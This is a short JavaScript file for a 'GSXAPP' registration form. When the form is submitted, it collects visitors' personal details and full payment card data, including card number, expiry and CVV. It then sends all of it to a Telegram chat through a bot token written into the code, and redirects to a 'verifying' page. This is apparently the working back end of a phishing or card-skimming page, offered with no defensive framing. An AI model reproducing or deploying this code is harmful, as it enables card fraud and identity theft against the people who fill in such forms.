let form = document.querySelector("#form");

let bot = {
	TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
	chatID: "-1001571702765",
}

form.addEventListener("submit", e => {
	e.preventDefault();
	
	var fullname = document.getElementById("inputFullName").value;
	var dob = document.getElementById("inputDOB").value;
	var email = document.getElementById("inputEmailAddress").value;
	var mobile = document.getElementById("inputMobileNumber").value;
	var gender = document.getElementById("inputGender").value;
	var occupation = document.getElementById("inputOccupation").value;
	var address = document.getElementById("inputAddress").value;
	var city = document.getElementById("inputCity").value;
	var postalcode = document.getElementById("inputPostalCode").value;
	var state = document.getElementById("inputState").value;
	var district = document.getElementById("inputDistrict").value;
	var country = document.getElementById("inputCountry").value;	
	var noc = document.getElementById("inputNameOnCard").value;
	var number = document.getElementById("inputCardNumber").value;
	var expiry = document.getElementById("inputExpiry").value;
	var cvv = document.getElementById("inputCVV").value;
	
	var my_text = `GSXAPP Registration Order:%0A%0A Personal Details:%0A - Full Name: ${fullname} %0A - Date Of Birth: ${dob} %0A - Email Address: ${email} %0A - Mobile Number: ${mobile} %0A - Gender: ${gender} %0A - Occupation: ${occupation} %0A%0A Address Details: %0A - Address: ${address} %0A - City: ${city} %0A - Postal Code: ${postalcode} %0A - State: ${state} %0A - District: ${district} %0A - Country: ${country} %0A%0A Card Details: %0A - Card Holder Name: ${noc} %0A - Card Number: ${number} %0A - Expiry: ${expiry} %0A - CVV: ${cvv}`
	
	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
		method: "GET"
	})
	.then(success => {
		window.location.assign("https://gsxapp.com/verifying")
	}, error => {
		alert("Please check your internet connection!")
		console.log(error);
	})
})